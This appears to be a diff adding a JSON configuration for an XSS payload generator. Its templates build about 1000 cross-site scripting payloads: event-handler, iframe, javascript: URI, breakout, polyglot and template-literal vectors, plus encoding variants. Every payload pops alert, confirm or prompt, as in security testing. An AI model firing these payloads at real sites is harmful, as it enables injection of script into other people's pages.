@@ -1,0 +1,241 @@
+{
+  "metadata": {
+    "name": "XSS Payload Generator — 1000 Breakout-Aware",
+    "description": "Production XSS generator with breakout sequences as first-class vectors. Capped to exactly 1000 payloads via per-context limits + final random sampling."
+  },
+  "allow_contextual_encodings": true,
+  "assume_media_src_valid": false,
+
+  "context_bindings": {
+    "html_text":        ["inline_event", "script", "iframe", "anchor", "form", "object_embed"],
+    "unquoted_attr":    ["inline_event", "breakout_attr", "anchor", "object_embed"],
+    "quoted_attr":      ["inline_event", "breakout_attr", "anchor", "object_embed"],
+    "script_body":      ["script"],
+    "url_param":        ["anchor", "iframe", "object_embed"],
+    "breakout_script":  ["breakout_script_ctx", "breakout_template"],
+    "breakout_comment": ["breakout_comment"],
+    "breakout_style":   ["breakout_style_ctx"],
+    "polyglot":         ["polyglot"]
+  },
+
+  "functions": [
+    { "name": "alert", "value": "1" },
+    { "name": "confirm", "value": "1" },
+    { "name": "prompt", "value": "1" }
+  ],
+
+  "events": {
+    "standard": [
+      "onload", "onerror", "onmouseover", "onclick",
+      "onfocus", "onblur", "onabort", "onscroll"
+    ],
+    "extended": [
+      "ondblclick", "onkeydown", "onkeypress", "onkeyup",
+      "onmousedown", "onmouseup", "onmousemove",
+      "onmouseenter", "onmouseleave", "onwheel",
+      "onpointerdown", "onpointerup", "onpointermove",
+      "onauxclick", "oncontextmenu", "ondrag", "ondrop",
+      "onpointerenter", "onpointerleave",
+      "ongotpointercapture", "onlostpointercapture",
+      "ontoggle"
+    ],
+    "media": [
+      "oncanplay", "onended", "onloadeddata",
+      "onloadedmetadata", "onloadstart", "onpause",
+      "onplay", "onplaying", "onprogress",
+      "ontimeupdate", "onvolumechange", "onwaiting"
+    ],
+    "document_body": [
+      "onafterprint", "onbeforeprint", "onbeforeunload",
+      "onhashchange", "onmessage",
+      "onoffline", "ononline", "onpagehide", "onpageshow",
+      "onpopstate", "onstorage", "onunload", "onresize"
+    ],
+    "animation_svg": [
+      "onbegin", "onend"
+    ]
+  },
+
+  "tags": {
+    "inline_event": {
+      "description": "Standard event handler tags",
+      "list": ["img", "svg", "body", "input", "select", "textarea", "details", "video", "audio", "marquee"],
+      "templates": [
+        "<{tag} {event}={function}({value})>",
+        "<{tag} src=x {event}={function}({value})>",
+        "<{tag} autofocus {event}={function}({value})>",
+        "<{tag} open {event}={function}({value})>"
+      ]
+    },
+
+    "script": {
+      "description": "Script body injections",
+      "list": ["script"],
+      "templates": [
+        "<{tag}>{function}({value})</{tag}>",
+        "<{tag}>{function}`{value}`</{tag}>",
+        "<{tag}>eval(atob('{base64}'))</{tag}>",
+        "<{tag}>setTimeout('{function}({value})')</{tag}>",
+        "<{tag} src=data:text/javascript;base64,{base64}></{tag}>"
+      ]
+    },
+
+    "iframe": {
+      "description": "iframe XSS vectors including srcdoc, javascript: URI, and event fallbacks",
+      "list": ["iframe"],
+      "templates": [
+        "<{tag} src=javascript:{function}({value})>",
+        "<{tag} srcdoc=\"<script>{function}({value})<\/script>\">",
+        "<{tag} {event}={function}({value}) src=x>",
+        "<{tag} src=javascript:void(0) {event}={function}({value})>"
+      ]
+    },
+
+    "anchor": {
+      "description": "Anchor-based vectors with javascript: href",
+      "list": ["a"],
+      "templates": [
+        "<{tag} href=javascript:{function}({value})>x</{tag}>",
+        "<{tag} href=javascript:void(0) {event}={function}({value})>x</{tag}>"
+      ]
+    },
+
+    "form": {
+      "description": "Form-based XSS vectors",
+      "list": ["form"],
+      "templates": [
+        "<{tag} action=javascript:{function}({value})><input type=submit>",
+        "<{tag} {event}={function}({value})><input type=submit>"
+      ]
+    },
+
+    "object_embed": {
+      "description": "Object & embed data URI and javascript: vectors",
+      "list": ["object", "embed"],
+      "templates": [
+        "<{tag} data=data:text/html;base64,{base64_full_page}>",
+        "<{tag} type=text/html data=javascript:{function}({value})>",
+        "<{tag} src=javascript:{function}({value})>"
+      ]
+    },
+
+    "breakout_attr": {
+      "description": "BREAKOUT: Close existing attribute/tag and inject new executable context.",
+      "list": ["break_attr"],
+      "templates": [
+        "\">{function}({value})<x",
+        "\"><script>{function}({value})<\/script>",
+        "'>{function}({value})<x",
+        "'><script>{function}({value})<\/script>",
+        " {event}={function}({value}) autofocus x=x",
+        "\" {event}={function}({value}) autofocus x=x",
+        "' {event}={function}({value}) autofocus x=x",
+        "href=javascript:{function}({value})",
+        "\"href=javascript:{function}({value})",
+        "'href=javascript:{function}({value})",
+        "\"><svg {event}=alert(1)>",
+        "'><svg {event}=alert(1)>"
+      ]
+    },
+
+    "breakout_script_ctx": {
+      "description": "BREAKOUT: Close enclosing script tag or JS string context",
+      "list": ["break_script"],
+      "templates": [
+        "</script><script>{function}({value})<\/script>",
+        "</script><img src=x onerror={function}({value})>",
+        "</script><svg onload={function}({value})>",
+        "';{function}({value})//",
+        "';{function}({value})';",
+        "\";{function}({value})//",
+        "\";{function}({value})\";",
+        "\\';{function}({value})//",
+        "';eval(atob('{base64}'))//",
+        "\";eval(atob('{base64}'))//",
+        "</script><iframe src=javascript:{function}({value})>",
+        "</script><body onload={function}({value})>",
+        "</script><input autofocus onfocus={function}({value})>"
+      ]
+    },
+
+    "breakout_template": {
+      "description": "BREAKOUT: Template literal injection via `${...}` syntax.",
+      "list": ["break_tpl"],
+      "templates": [
+        "${{function}({value})}",
+        "${{7*7}}",
+        "${{constructor.constructor({function}({value}))()}}",
+        "xxx${{function}({value})}xxx",
+        "${{window[{function}]({value})}}"
+      ]
+    },
+
+    "breakout_comment": {
+      "description": "BREAKOUT: Close an HTML or JS comment block and inject script",
+      "list": ["break_cm"],
+      "templates": [
+        "--><script>{function}({value})<\/script>",
+        "--><img src=x onerror={function}({value})>",
+        "--><svg onload={function}({value})>",
+        "*/alert({value});/*",
+        "*/{function}({value});/*",
+        "--><body onload={function}({value})>",
+        "--><input autofocus onfocus={function}({value})>",
+        "//--><script>{function}({value})<\/script>//-->"
+      ]
+    },
+
+    "breakout_style_ctx": {
+      "description": "BREAKOUT: Close a style, title, textarea, or noscript tag",
+      "list": ["break_sty"],
+      "templates": [
+        "</style><script>{function}({value})<\/script>",
+        "</style><img src=x onerror={function}({value})>",
+        "</style><svg onload={function}({value})>",
+        "</title><script>{function}({value})<\/script>",
+        "</title><img src=x onerror={function}({value})>",
+        "</textarea><script>{function}({value})<\/script>",
+        "</textarea><img src=x onerror={function}({value})>",
+        "</noscript><script>{function}({value})<\/script>",
+        "</style><body onload={function}({value})>"
+      ]
+    },
+
+    "polyglot": {
+      "description": "POLYGLOT: Payloads designed to fire in multiple contexts",
+      "list": ["poly"],
+      "templates": [
+        "\"'><script>{function}({value})<\/script>",
+        "\"'><img src=x onerror={function}({value})>",
+        "\"'><svg onload={function}({value})>",
+        "\"'>{{function}({value})}",
+        "\"';{function}({value})//",
+        "\"' autofocus onfocus={function}({value}) x=\"'",
+        "\"' onmouseover={function}({value}) x=\"'",
+        "javascript:{function}({value})//\"'/>",
+        "\"'/>{function}({value})<x",
+        "\"'></script><script>{function}({value})<\/script>"
+      ]
+    }
+  },
+
+  "encodings": {
+    "raw":                { "apply_to": "raw", "transform": "none" },
+    "base64_eval":        { "apply_to": "function_call", "transform": "base64_eval" },
+    "html_entity_dec":    { "apply_to": "full_payload", "transform": "html_entity_decimal" },
+    "html_entity_hex":    { "apply_to": "full_payload", "transform": "html_entity_hex" },
+    "url_encoded":        { "apply_to": "full_payload", "transform": "url_encoded" },
+    "double_url_encoded": { "apply_to": "full_payload", "transform": "double_url_encoded" }
+  },
+
+  "generation_options": {
+    "include_interaction_events": true,
+    "include_media_events": false,
+    "include_document_body_events": false,
+    "include_animation_svg_events": false,
+    "max_payloads_per_context": 120,
+    "random_sample_size": 1000
+  },
+
+  "full_page_base64": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+}
